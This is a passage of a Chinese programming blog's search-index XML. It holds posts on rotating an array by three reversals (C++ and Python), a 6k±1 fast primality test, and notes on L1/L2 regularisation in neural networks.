punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">"请输入数字序列：\n"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  length <span class="token operator">=</span> term<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  Move <span class="token operator">=</span> term<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%</span> length  <span class="token comment" spellcheck="true">//进行反转  </span><span class="token function">Myreverse</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> Move <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token function">Myreverse</span><span class="token punctuation">(</span>Move<span class="token punctuation">,</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token function">Myreverse</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"数组向左平移 %d 单位后的结果为：\n%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Move<span class="token punctuation">,</span> <span class="token function">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 欢迎交流指正<br> ![Alt](<a href="https://happyologist.co.uk/wp-content/uploads/happy.jpeg" target="_blank" rel="noopener">https://happyologist.co.uk/wp-content/uploads/happy.jpeg</a> =200x150)  </p><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列型数据平移</title>
      <link href="/2019/02/17/2019-xu-lie-ping-yi/"/>
      <url>/2019/02/17/2019-xu-lie-ping-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 例如{1， 2， 3， 4， 5， 6， 7，8}要向左平移2个单位  </p><ul><li>先将前两个数据{1，2}反转为{2，1}  </li><li>之后将后面的数据{3，4，5，6，7，8}反转为{8，7，6，5，4，3}  </li><li>两个片段的相对位置没有改变得到了{2，1，8，7，6，5，4，3}  </li><li>最后将总数据进行反转便得到了{3，4，5，6，7，8，1，2}  </li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p><strong>C++实现</strong>  </p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span>  </span>using namespace std<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token function">Myreverse</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> Begin<span class="token punctuation">,</span> <span class="token keyword">int</span> End<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">int</span> N<span class="token punctuation">,</span>Move<span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      cin<span class="token operator">>></span>N<span class="token operator">>></span>Move<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//对Move进行处理  </span>    Move <span class="token operator">=</span> Move <span class="token operator">%</span> N<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//传进反转的开始和结束的下标  </span>    <span class="token function">Myreverse</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Move <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">Myreverse</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span> Move<span class="token punctuation">,</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">Myreverse</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          cout<span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">' '</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">Myreverse</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> Begin<span class="token punctuation">,</span> <span class="token keyword">int</span> End<span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> Begin<span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Begin <span class="token operator">+</span> End<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">int</span> m <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>python实现</strong>（复制后注意修改注释符号为‘#’哦）  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">//</span> 定义反转函数   <span class="token keyword">def</span> <span class="token function">Myreverse</span><span class="token punctuation">(</span>Begin<span class="token punctuation">,</span> End<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">global</span> a      <span class="token keyword">for</span> i <span class="token keyword">in</span>  range<span class="token punctuation">(</span>Begin<span class="token punctuation">,</span> <span class="token punctuation">(</span>Begin <span class="token operator">+</span> End<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          m <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>          a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span>          a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> m  <span class="token operator">//</span>输入数据          term <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> input<span class="token punctuation">(</span><span class="token string">"请输入长度和左移量："</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  a <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> input<span class="token punctuation">(</span><span class="token string">"请输入数字序列：\n"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  length <span class="token operator">=</span> term<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  Move <span class="token operator">=</span> term<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%</span> length  <span class="token operator">//</span>进行反转  Myreverse<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> Move <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  Myreverse<span class="token punctuation">(</span>Move<span class="token punctuation">,</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  Myreverse<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数组向左平移 %d 单位后的结果为：\n%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Move<span class="token punctuation">,</span> str<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 欢迎交流指正<br> ![Alt](<a href="https://happyologist.co.uk/wp-content/uploads/happy.jpeg" target="_blank" rel="noopener">https://happyologist.co.uk/wp-content/uploads/happy.jpeg</a> =200x150) </p><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速素数判断算法</title>
      <link href="/2019/02/17/2019-kuai-su-su-shu-pan-duan-suan-fa/"/>
      <url>/2019/02/17/2019-kuai-su-su-shu-pan-duan-suan-fa/</url>
      
        <content type="html"><![CDATA[<p>最近在复习之前做的编程练习题，素数判断一直没有掌握，今天看到了一种新的方法，感觉特别好，记下来。（第一次写博客，很开心呀）<br><a href="https://blog.csdn.net/huang_miao_xin/article/details/51331710" target="_blank" rel="noopener">思想来源,看不懂我的,欢迎看原作</a>  </p><h2 id="素数的一些性质吧"><a href="#素数的一些性质吧" class="headerlink" title="素数的一些性质吧"></a>素数的一些性质吧</h2><ol><li>素数的分布规律<br>大于5的素数一定于6的倍数相邻,例如5和7,11和13,17和19等等。  </li><li>证明<br>令 x ≥ 1,则大于5的自然数可以表示如下:<br>…….6x-1, 6x, 6x+1, 6x+2, 6x+3, 6x+4, 6x+5,6(x+1)-1………..<br>可以看到,不在6的倍数的两侧的6x+2, 6x+3, 6x+4,由于上式可表示为2(3x+1), 2(2x+3), 2(3x+2),So 他们一定不是素数,在除去6x本身,显然素数只能出现在6的倍数的两侧,但这只是素数的必要条件可不是充分必要条件,所以在6的倍数的两侧的数也不一定素数。  </li><li>孪生素数<br>题外话，放个题<a href="https://pintia.cn/problem-sets/994805260223102976/problems/994805317546655744" target="_blank" rel="noopener">拿走练练</a>  </li></ol><h2 id="C-代码实现与解析"><a href="#C-代码实现与解析" class="headerlink" title="C++代码实现与解析"></a>C++代码实现与解析</h2><p><strong>明确目的:</strong> 找到可以整除的数(这很重要)<br><strong>实现:</strong>  </p><ul><li>首先对两个较小的素数进行处理  </li><li>接下来判断这个数是否在6的倍数的两侧,不是的话直接返回0,是的话接着处理  </li><li>由于一个数N如果可以被另一个数m整除，那m一定小于N的开方,没啥问题。所以我们就取判断的上界为N的开方。为了更快呢，直接取 i 的每次递增6，原因是，假如要判断的数为N，那N一定可以表示为6x-1或6x+1，对于循环中的 i 也可以表示为6的倍数加上或减去个数字，即6m-1，6m，6m+1，6m+2，6m+3，6m+4，如果N能被6m，6m+2，6m+4，整除那N至少是一个偶数，显然第二步已经把偶数排除了，所以不可能成立，而对于6m+3如果成立则N至少是3的倍数，但6x是3的倍数，显然6x+1，6x-1可能被3整除，所以N也不可能被6m+3整除，那现在就只剩下了6m-1，6m+1了，只需判断它俩能否把N整除，如果可以那就存在了一个数可以把N整除，就返回0。反之就不存在了，那就走到了最后就返回1，哈哈大功告成。  </li></ul><pre class="line-numbers language-javascript"><code class="language-javascript">bool <span class="token function">isPrime</span><span class="token punctuation">(</span>int num<span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 两个较小的数另外处理  </span>    <span class="token keyword">if</span><span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">||</span> num <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 不在6的倍数的两侧的一定不是素数  </span>    <span class="token keyword">if</span><span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> num <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">!=</span> <span class="token number">5</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      int tem <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token function">sqrt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//在6的倍数的两侧的也不一定是素数  </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>int i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> tem<span class="token punctuation">;</span>i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>num <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> num <span class="token operator">%</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>              <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 排除所有剩余的是素数  </span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>人生第一篇博客，如有错误欢迎指正讨论。谢谢我自己，也谢谢大家<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2hpcGhvdG9zLmJhaWR1LmNvbS9mZWVkL3BpYy9pdGVtL2Q1MmEyODM0MzQ5YjAzM2I3OWVlZTA2ZDFmY2UzNmQzZDUzOWJkMjYuanBn" alt="在这里插入图片描述">  </p><p>  写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则化</title>
      <link href="/2019/01/22/2019-zheng-ze-hua/"/>
      <url>/2019/01/22/2019-zheng-ze-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h1><h2 id="正则化的目的"><a href="#正则化的目的" class="headerlink" title="正则化的目的"></a>正则化的目的</h2><ul><li>神经网络过度拟合了数据  </li><li>减小网络误差  </li></ul><h2 id="正则化的作用原理"><a href="#正则化的作用原理" class="headerlink" title="正则化的作用原理"></a>正则化的作用原理</h2><h3 id="逻辑回归中的正则化"><a href="#逻辑回归中的正则化" class="headerlink" title="逻辑回归中的正则化"></a>逻辑回归中的正则化</h3><ul><li>最小化误差函数时，添加一个新的参数D，这个参数是关于W的，而没有关于b的  </li><li>因为W本身是一个高维参数矢量，已经可以表达高偏差问题，W本身包含很多参数而b仅仅是单个数字，加了b没有太大影响反而使运算变得复杂  </li><li>L2正则化，表示取的是W的2-范数即<code>||W||2</code>， 所有元素的平方和再开根号  </li><li>L1正则化，表示取的是W的1-范数即<code>||W||1</code>， 所有元素的和  </li><li>更倾向于使用<strong>L2正则化</strong>，  </li><li>参数 λ 使用验证集或交叉验证来配置， 尝试各种各样的数据来寻找最好的参数，一般设置的值比较小  </li><li><img src="https://0d077ef9e74d8.cdn.sohucs.com/rphxWDP_jpg" alt="逻辑回归中的L2正则化.jpg">  </li></ul><h3 id="神经网络中的正则化"><a href="#神经网络中的正则化" class="headerlink" title="神经网络中的正则化"></a>神经网络中的正则化</h3><ul><li>Wi的“佛罗贝尼乌斯范数” 取的是Wi中所有元素的平方和开根号， 其实就是L2范数，只是不这么叫  </li><li>L2正则化已被称为权重衰减，因为反向传播后时Wi的权重会减小  </li><li><img src="https://0d077ef9e74d8.cdn.sohucs.com/rphy6Vj_jpg" alt="神经网络的正则化.jpg">  </li></ul><h2 id="为什么正则化可以防止过拟合"><a href="#为什么正则化可以防止过拟合" class="headerlink" title="为什么正则化可以防止过拟合"></a>为什么正则化可以防止过拟合</h2><blockquote><p>不好说，基本原理是减小部分神经元节点的权值，使整个神经网络更倾向于逻辑回归  </p></blockquote><blockquote><p>λ增加，W减小，相应的节点权重减小, tanh 减小，在 0 附近近似为线性函数， 最后整体拟合程度下降<br>    <img src="https://0d077ef9e74d8.cdn.sohucs.com/rpiZfsu_jpg" alt></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> 基本概念 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
